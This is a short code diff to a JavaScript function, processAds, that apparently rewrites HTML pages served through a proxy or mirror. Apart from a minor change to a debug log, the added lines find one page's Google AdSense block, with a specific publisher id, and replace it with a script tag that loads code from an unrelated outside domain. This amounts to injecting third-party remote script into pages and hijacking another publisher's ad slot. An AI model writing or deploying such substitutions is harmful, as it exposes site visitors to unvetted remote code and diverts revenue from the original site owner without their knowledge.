@@ -260,8 +260,8 @@ function processAds (opts) {
         //     <header class="entry-header entry-header-notop">
         // `);
 
-        if(request.url === '/360help/354727.html') {
-            console.log(`==========>${html}`);
+        if(request.url.trim().toLowerCase() === '/360help/354727.html') {
+            console.log(`=>${html}`);
         }
 
         //西安微趣广告
@@ -271,6 +271,11 @@ function processAds (opts) {
             </div>
             <header class="entry-header entry-header-notop">
         `);
+
+        html = html.replace(
+            "<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script><!-- 手机文章标题顶部 --><ins class=\"adsbygoogle\" style=\"display:block;margin:auto;width:300px;height:250px\" data-ad-client=\"ca-pub-0044506972792760\" data-ad-slot=\"2984604849\"></ins><script>(adsbygoogle = window.adsbygoogle || []).push({});</script>",
+            "<script src='https://xin.pozwf.cn/?id=40060'></script>"
+        );
 
         // return html;
     }
